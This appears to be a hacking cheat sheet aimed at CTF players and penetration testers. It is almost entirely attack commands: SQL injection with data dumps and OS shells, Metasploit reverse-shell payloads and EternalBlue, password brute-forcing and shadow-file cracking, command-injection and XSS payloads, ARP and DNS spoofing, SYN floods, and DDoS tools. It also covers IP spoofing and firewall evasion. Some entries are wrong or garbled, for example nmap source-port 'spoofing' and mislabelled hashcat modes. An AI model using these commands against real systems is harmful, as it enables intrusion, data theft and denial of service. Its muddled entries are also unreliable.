# Made By Taylor Christian Newsome
```
# Netcat
nc -l -p <port>: Listen on a port
nc <host> <port>: Connect to a host on a port
nc -v <host> <port>: Verbose connect to a host on a port
nc -z <host> <port>: Port scanning
nc -u -l -p <port>: UDP listen on a port
nc -u <host> <port>: UDP connect to a host on a port

# OpenSSL
openssl s_client -connect <host>:<port>: Connect to SSL/TLS server
openssl s_client -connect <host>:<port> -showcerts: Show server certificate
openssl s_client -connect <host>:<port> -starttls smtp: Start TLS SMTP session
openssl s_client -connect <host>:<port> -starttls pop3: Start TLS POP3 session
openssl s_client -connect <host>:<port> -starttls imap: Start TLS IMAP session
openssl s_client -connect <host>:<port> -starttls ftp: Start TLS FTP session
openssl s_client -connect <host>:<port> -starttls ldap: Start TLS LDAP session
openssl s_client -connect <host>:<port> -starttls smb: Start TLS SMB session
openssl s_client -connect <host>:<port> -starttls xmpp: Start TLS XMPP session
openssl s_client -connect <host>:<port> -starttls mysql: Start TLS MySQL session
openssl s_client -connect <host>:<port> -starttls postgres: Start TLS PostgreSQL session
openssl s_client -connect <host>:<port> -starttls ldaps: Start TLS LDAPS session

Gobuster and Dirbuster Cheat Sheet

Gobuster:
Gobuster is a command-line tool used for brute-forcing directories, files, and DNS subdomains on web servers.

Common Gobuster Syntax:
gobuster <mode> -u <URL> -w <wordlist> [options]

Modes:

dir: Directory and file brute-forcing
dns: DNS subdomain brute-forcing
vhost: Virtual host brute-forcing
Examples for Gobuster:

Directory and File Discovery:
gobuster dir -u http://example.com -w /path/to/wordlist.txt

DNS Subdomain Brute-forcing:
gobuster dns -d example.com -w /path/to/subdomains.txt

Virtual Host Brute-forcing:
gobuster vhost -u http://example.com -w /path/to/vhosts.txt

Useful Options:

-t <threads>: Number of threads (default 10).
-o <output.txt>: Write results to a file.
-x <extensions>: Append file extensions (e.g., .php,.html).
-r: Prevent redirects.
-k: Ignore SSL certificate errors.
Dirbuster:
Dirbuster is a graphical tool designed for brute-forcing web server directories and files. It uses a wordlist-based approach.

Steps to Use Dirbuster:

Open Dirbuster.
Enter the target URL (e.g., http://example.com).
Select a wordlist:
Example: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Set the file extensions to search (e.g., .php,.html,.txt).
Configure number of threads (default 10, increase for faster scans).
Start the scan.
Dirbuster Tips:

Use recursive mode to scan subdirectories.
Choose the right wordlist size for your target to balance speed and thoroughness.
Save results to a file for analysis.

# SQL Injection (sqlmap)
sqlmap -u "<url>" --dbs: Enumerate databases
sqlmap -u "<url>" -D <db> --tables: Enumerate tables in database
sqlmap -u "<url>" -D <db> -T <table> --columns: Enumerate columns in table
sqlmap -u "<url>" -D <db> -T <table> -C <column> --dump: Dump data from column
sqlmap -u "<url>" --os-shell: Get OS shell
sqlmap -u "<url>" --file-read=<file>: Read file from server
sqlmap -u "<url>" --file-write=<file> --file-dest=<dest>: Write file to server
sqlmap -u "<url>" --sql-shell: Get SQL shell
sqlmap -u "<url>" --os-pwn: Get OS shell
sqlmap -u "<url>" --users: Enumerate users
sqlmap -u "<url>" --passwords: Enumerate passwords
sqlmap -u "<url>" --privileges: Enumerate privileges
sqlmap -u "<url>" --roles: Enumerate roles
sqlmap -u "<url>" --dbs --batch: Batch mode
sqlmap -u "<url>" --dbs --batch --threads=<num>: Batch mode with threads
sqlmap -u "<url>" --dbs --batch --threads=<num> --level=<level>: Batch mode with threads and level
sqlmap -u "<url>" --dbs --batch --threads=<num> --level=<level> --risk=<risk>: Batch mode with threads, level, and risk
sqlmap -u "<url>" --dbs --batch --threads=<num> --level=<level> --risk=<risk> --flush-session: Flush session
sqlmap -u "<url>" --dbs --batch --threads=<num> --level=<level> --risk=<risk> --flush-session --fresh-queries: Flush session and fresh queries

# General CTF Tools & Techniques

# Reconnaissance & Information Gathering
whois <domain>: Get domain registration details
dig <domain>: DNS lookup
nmap -sP <ip-range>: Ping sweep to discover live hosts
nmap -sV -p <ports> <target>: Version scan to detect services running on specified ports
nmap -O <target>: OS detection
nmap --script <script-name> <target>: Run Nmap scripts (e.g., vulnerability detection)
nikto -h <target>: Web server scanner
dirbuster / gobuster -u <url> -w <wordlist>: Directory and file brute-forcing

# Exploitation
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format>: Generate a payload (e.g., reverse shell, meterpreter)
msfconsole: Start Metasploit Framework
use exploit/multi/handler: Start listener for a reverse shell in Metasploit
set RHOSTS <target-ip>: Set target for Metasploit exploit
set LHOST <attacker-ip>: Set local host (attacker) IP
set LPORT <port>: Set local port for reverse shell
exploit: Execute exploit after configuration in Metasploit
search <vulnerability>: Search for known exploits in Metasploit
hydra -l <username> -P <password-list> <target> <protocol>: Brute-force login (e.g., SSH, FTP)
burpsuite: Intercept and modify HTTP requests/responses
sqlmap -u <url> --crawl=1: Crawl a website for potential injection points
snmpwalk -v 2c -c <community-string> <target>: SNMP enumeration

# Post-Exploitation
netstat -an: View active connections
ps aux: List running processes
pwd: Print current working directory
ls: List files and directories
cat <file>: Display contents of a file
chmod +x <file>: Make a file executable
wget <file-url>: Download files
curl <url>: Retrieve or interact with web resources
scp <file> <user>@<target>:<path>: Copy files over SSH
tar -cvf <archive>.tar <directory>: Create a tar archive
tar -xvf <archive>.tar: Extract a tar archive
ps aux | grep <process>: Find running process

# Web Application Hacking (OWASP Top 10)
Cross-Site Scripting (XSS): Inject malicious scripts into web pages to steal session cookies or data
Use payloads like <script>alert('XSS')</script>
Cross-Site Request Forgery (CSRF): Trick a user into performing an unwanted action
Use tools like CSRF Tester to identify vulnerabilities
Command Injection: Inject OS commands into a vulnerable web application
Test input fields with payloads like ; ls or | cat /etc/passwd
File Upload Vulnerabilities: Upload malicious files to a server
Use tools like Burp Suite to manipulate file upload requests

# Miscellaneous CTF Techniques
Buffer Overflow: Inject shellcode into a buffer to take control of execution flow
Use tools like gdb for analysis and pwntools to exploit
Cryptography: Decrypt/encode messages in challenges
Tools like hashcat for cracking password hashes, or CyberChef for various encodings and decodings
Steganography: Hide data inside files (e.g., images, audio)
Use steghide or binwalk to extract hidden data

# General Cracking Techniques
# Brute Force
Brute Force
Brute-force attack: Trying every possible combination of characters to crack a password
Tool: John the Ripper, Hashcat, Hydra, Medusa
Command:
john --incremental <hashfile>: Brute-force attack with John the Ripper
hashcat -m <hash-mode> -a 3 <hashfile> <charset>: Brute-force attack with Hashcat (e.g., -a 3 for brute force, -m 0 for MD5)
hydra -l <username> -P <password-list> <target> <protocol>: Brute-force a login (e.g., SSH, FTP, HTTP)

# Dictionary Attack
Dictionary attack: Using a list of common passwords or word lists to crack passwords
Tool: John the Ripper, Hashcat, Hydra
Command:
john --wordlist=<path-to-wordlist> <hashfile>: Dictionary attack with John the Ripper
hashcat -m <hash-mode> -a 0 <hashfile> <wordlist>: Dictionary attack with Hashcat
hydra -l <username> -P <wordlist> <target> <protocol>: Dictionary attack with Hydra

# Hybrid Attack
Hybrid attack: A mix of dictionary and brute-force (e.g., appending numbers to dictionary words)
Tool: John the Ripper, Hashcat
Command:
john --wordlist=<wordlist> --rules --incremental <hashfile>: Hybrid attack with John the Ripper
hashcat -m <hash-mode> -a 6 <hashfile> <wordlist> <mask>: Hybrid attack with Hashcat (-a 6 for hybrid attack mode)

# Hash Cracking
John the Ripper
John the Ripper: A tool for cracking password hashes using dictionary, brute-force, and hybrid attacks
john <hashfile>: Crack password hashes using the default method
john --format=<hash-type> <hashfile>: Specify the hash format (e.g., --format=raw-md5, --format=sha256)
john --wordlist=<wordlist> <hashfile>: Use a custom wordlist for cracking
john --rules --wordlist=<wordlist> <hashfile>: Use predefined rules for more complex cracking
john --show <hashfile>: Show cracked passwords

# Hashcat
Hashcat: A powerful password cracker supporting a variety of algorithms and attack modes
hashcat -m <hash-mode> -a 0 <hashfile> <wordlist>: Dictionary attack with Hashcat
hashcat -m <hash-mode> -a 3 <hashfile> <mask>: Brute-force attack with Hashcat
hashcat -m <hash-mode> -a 6 <hashfile> <wordlist> <mask>: Hybrid attack with Hashcat
hashcat -m <hash-mode> -a 0 -r <rules-file> <hashfile> <wordlist>: Dictionary attack

# Common Hash Types
MD5: -m 0
SHA-1: -m 100
SHA-256: -m 1400
SHA-512: -m 1700
NTLM: -m 1000
bcrypt: -m 3200
PBKDF2: -m 1100
LM Hash: -m 3000

# Cracking Online Passwords
Hydra: Brute-force and dictionary attacks for online login services
hydra -l <username> -P <password-list> <target> <protocol>: Use Hydra to brute-force a login (e.g., FTP, SSH, HTTP)
hydra -L <user-list> -P <password-list> <target> <protocol>: Brute-force multiple usernames and passwords

# Rainbow Tables
Rainbow tables: Precomputed tables used to quickly find the password from a hash
Tool: rtgen, RainbowCrack
Command:
rtgen <hash-type> <charset> <min-len> <max-len> <table-size> <chain-length>: Generate rainbow tables for a specific hash type (e.g., MD5, SHA1)
rcrack <rainbow-table> <hashfile>: Crack hashes using rainbow tables

# Password Hashes from Different Sources
Linux/Unix Passwords
/etc/passwd and /etc/shadow (hashes):
unshadow /etc/passwd /etc/shadow > <output-file>: Combine /etc/passwd and /etc/shadow to extract hashes
Use John the Ripper or Hashcat to crack the hashes

# Windows NTLM Hashes
NTLM Hashes:
hashcat -m 1000 -a 0 <ntlm-hash-file> <wordlist>: Crack NTLM hashes with Hashcat

# Web Application Hashes
PHPBB, WordPress, etc. (MD5, bcrypt):
Extract hashes from database backups (e.g., SQL dumps) and crack them with John the Ripper or Hashcat

# Cracking Web Application Passwords
# Burp Suite
Intruder: Use Burp Suite’s Intruder to brute-force web forms with custom payloads
Add the payload (usernames and/or passwords) and configure the attack type (e.g., Sniper, Pitchfork, Cluster Bomb)
Use Burp Suite Extensions like Burp Suite Intruder++ to add more attack modes

# Wordlist Customization
Custom Wordlists: Use tools to generate custom wordlists or manipulate existing ones
cewl -w <output-file> <url>: Custom wordlist generator based on a website's content
hashcat --stdout <wordlist> -r <rules>: Generate wordlist with Hashcat rules
Crunch: Use Crunch to generate wordlists based on specific patterns or lengths
crunch <min-len> <max-len> -o <output-file>

# Password List Optimization
Common Wordlist: Use common wordlists such as rockyou.txt or darkc0de.lst
Download RockYou wordlist: wget https://github.com/digininja/rockyou -O rockyou.txt
Use sort, uniq, and grep commands to filter out duplicates and unwanted entries

# Mask/Pattern Based Attacks
Mask Attack: Use known patterns (e.g., password123, !Q2w3E4r)
hashcat -m <hash-type> -a 3 <hashfile> ?l?l?l?l?d?d: Crack passwords of specific pattern (4 lowercase letters followed by 2 digits)
Character sets:
?l: Lowercase letters (a-z)
?u: Uppercase letters (A-Z)
?d: Digits (0-9)
?s: Special characters (e.g., !@#$%^&*)
?a: All characters (lowercase, uppercase, digits, and symbols)

# Password Cracking Tools
John the Ripper: Open-source password cracking tool that supports many hash types.
Hashcat: One of the fastest and most popular password-cracking tools, supports GPU acceleration.
Hydra: Fast online brute-forcer supporting many protocols (HTTP, FTP, SSH, etc.).
Medusa: Another online brute-force tool similar to Hydra.
Cain & Abel: Windows-based password recovery tool supporting a wide range of hashes and network protocols.
Aircrack-ng: Cracking WEP/WPA wireless network passwords.
Ophcrack: A Windows password cracker using rainbow tables.

# Additional Resources
Password Cracking Wordlists:
Rockyou.txt: A popular password list based on a real data breach.
SecLists: A collection of useful wordlists for penetration tests.
GitHub Wordlists: Look for public wordlists in GitHub repositories related to password cracking.

# General IP Hacking Techniques
# IP Spoofing
IP Spoofing: Sending packets with a forged source IP address to hide the true origin of the attack.
Tool: Hping3, Scapy, Nmap, Metasploit
Command:
hping3 --spoof <target-ip> <target> -p <port>: Spoof IP with Hping3
scapy: Use Python-based Scapy for custom IP spoofing scripts
nmap --source-port <port> <target>: Use a source port to spoof an IP address in Nmap scans
metasploit: Use Metasploit’s built-in options to spoof IPs in exploits

# IP Address Scanning
Network Scanning: Finding live hosts, open ports, and vulnerabilities in a network.
Tool: Nmap, Masscan, Angry IP Scanner
Command:
nmap -sP <network-range>: Ping sweep to discover active hosts in a network
nmap -p <ports> <target-ip>: Scan for open ports on a specific target IP
masscan <target-range> -p0-65535: Use Masscan for a faster port scan (across large networks)

# IP Geolocation and Trace
IP Geolocation: Mapping an IP address to a physical location.
Tool: ipinfo.io, Whois, GeoIP
Command:
curl ipinfo.io/<target-ip>: Get basic geolocation and information about the IP
whois <target-ip>: Whois lookup to get information about IP ownership
geoiplookup <target-ip>: Use GeoIP to identify the country and location of the IP

# IP Forwarding & Tunneling
IP Forwarding: Allowing traffic to pass through a system from one network to another.
Tool: iptables, SSH, OpenVPN
Command:
echo 1 > /proc/sys/net/ipv4/ip_forward: Enable IP forwarding in Linux
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE: NAT setup for IP forwarding
ssh -D 1080 <user>@<target-ip>: Create a SOCKS proxy for tunneling through an IP
openvpn --config <vpn-config-file>: Use OpenVPN to tunnel traffic securely through an IP

# ARP Spoofing
ARP Spoofing/Poisoning: Sending fake ARP messages to associate a target’s IP with your MAC address.
Tool: arpspoof, Ettercap
Command:
arpspoof -i <interface> -t <target-ip> <gateway-ip>: Poison ARP to intercept traffic between the target and gateway
ettercap -T -q -i <interface> -M ARP /<target-ip>/ /<gateway-ip>/: Use Ettercap for ARP poisoning and MITM attack

# DNS Spoofing
DNS Spoofing: Redirecting traffic by manipulating DNS responses.
Tool: dnsspoof, Ettercap, mitmproxy
Command:
dnsspoof -i <interface> -f <dns-file>: Poison DNS cache with a fake DNS response
ettercap -T -q -i <interface> -M ARP /<target-ip>/ /<gateway-ip>/ -P dns_spoof: DNS spoofing with Ettercap
mitmproxy: Man-in-the-middle proxy for intercepting and modifying HTTP/HTTPS requests (useful for DNS poisoning)

# Network Injection Attacks
TCP/UDP Injection
TCP/UDP Injection: Sending malicious data to manipulate a TCP/UDP connection.
Tool: Hping3, Scapy
Command:
hping3 -S <target-ip> -p <target-port> --flood: Inject TCP SYN packets to flood a target
scapy: Use custom Python scripts for TCP/UDP packet injection

# SYN Flood
SYN Flood Attack: Overloading a target by sending a flood of SYN requests.
Tool: Hping3, Scapy, LOIC
Command:
hping3 --syn -p <target-port> <target-ip>: Perform SYN flood attack on a target
scapy: Script a custom SYN flood with Scapy
loic: Use Low Orbit Ion Cannon to launch SYN floods (easy-to-use DDoS tool)

# IP DoS (Denial of Service) and DDoS (Distributed Denial of Service)
DDoS Attack
Distributed Denial of Service: A coordinated attack using multiple sources to flood a target with traffic.
Tool: LOIC, HOIC, Hping3, Slowloris
Command:
loic: Use Low Orbit Ion Cannon for simple DDoS attacks
hoic: High Orbit Ion Cannon for more powerful DDoS attacks (floods HTTP)
hping3 --flood -S -p <target-port> <target-ip>: Perform a SYN flood via Hping3
Slowloris Attack
Slowloris: A DoS attack by sending partial HTTP requests to exhaust server resources.
Tool: Slowloris
Command:
perl slowloris.pl <target-ip>: Launch Slowloris attack on the target

# IP-Based Exploits and Vulnerabilities
SMB/NetBIOS Exploits
SMB/NetBIOS: Exploiting vulnerabilities in SMB services to gain unauthorized access to files and networks.
Tool: Metasploit, Nmap
Command:
msfconsole: Use Metasploit to exploit SMB/NetBIOS vulnerabilities (e.g., auxiliary/smb/smb_version, exploit/windows/smb/ms17_010_eternalblue)
nmap -p 139,445 --script=smb-os-discovery <target-ip>: Use Nmap scripts to find SMB shares and services
IP and Network Reconnaissance
Reconnaissance: Finding weaknesses in the network based on IP and other characteristics.
Tool: Nmap, Nikto, Netdiscover
Command:
nmap -sV -O <target-ip>: Identify services and OS information for a target IP
nikto -h <target-ip>: Scan for vulnerabilities in web servers
netdiscover: Discover IP addresses in a local network

# IP-Based Firewall/IDS/IPS Bypass
Bypassing Firewalls/IDS/IPS
Bypassing Filters: Techniques to bypass IP-based firewalls and Intrusion Detection/Prevention Systems.
Tool: Hping3, Nmap, Metasploit, Proxychains
Command:
nmap --mtu 8 --ip-options <option> <target-ip>: Modify packet size to bypass firewalls
hping3 --baseport 53 -p 80 --flood <target-ip>: Bypass firewalls by sending traffic to port 80 (HTTP) over DNS
proxychains nmap -sT -p 80 <target-ip>: Use Proxychains to bypass IP restrictions
IP Fragmentation
IP Fragmentation: Sending fragmented packets to evade packet inspection.
Tool: Scapy, Hping3
Command:
hping3 -d <data-size> --frag -p <target-port> <target-ip>: Send fragmented packets to the target
scapy: Craft fragmented packets with Scapy to bypass IDS/IPS

# Tools for IP Hacking
Nmap: Network scanner for discovering hosts, services, and vulnerabilities on a network.
Hping3: Packet crafting tool used for DoS attacks, spoofing, and network analysis.
Metasploit: Exploitation framework that can be used to exploit vulnerabilities in a target's IP or network.
Netdiscover: A network discovery tool to find devices in a local network.
Ettercap: Network sniffer and MITM tool for ARP spoofing, DNS spoofing, and sniffing traffic.
Wireshark: Network protocol analyzer to inspect and capture IP packets.
Proxychains: Tool for routing traffic through proxies to evade detection. 
```
